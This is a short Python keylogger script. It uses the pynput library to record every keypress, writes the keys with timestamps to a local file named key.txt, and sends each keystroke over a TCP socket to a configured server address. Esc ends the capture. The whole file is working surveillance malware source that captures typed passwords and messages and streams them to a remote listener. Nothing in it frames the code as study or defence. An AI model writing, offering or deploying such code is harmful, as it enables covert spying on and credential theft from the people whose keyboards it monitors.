import logging
from pynput.keyboard import Key, Listener
import socket

# Configuration
log_file = "key.txt"
server_ip = "127.0.0.1"
server_port = 9999


# Initialize socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

def on_press(key):
    try:
        key_data = str(key)
        logging.info(key_data)
        client.send(key_data.encode('utf-8'))  # Send the key data to the server
    except Exception as e:
        pass

def on_release(key):
    if key == Key.esc:
        client.close()
        return False

# Logging setup
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()





